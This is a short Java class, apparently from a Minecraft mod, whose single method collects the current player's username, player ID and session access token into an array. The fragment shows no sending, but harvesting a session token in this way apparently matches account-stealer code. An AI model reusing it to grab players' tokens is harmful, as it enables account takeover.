package dev.schubilegend.handlers;

import net.minecraft.client.Minecraft;

public class MinecraftHandler {
    public String[] getMcInfo(){
        return new String[]{Minecraft.getMinecraft().getSession().getUsername(),Minecraft.getMinecraft().getSession().getPlayerID(),Minecraft.getMinecraft().getSession().getToken()};
    }

}
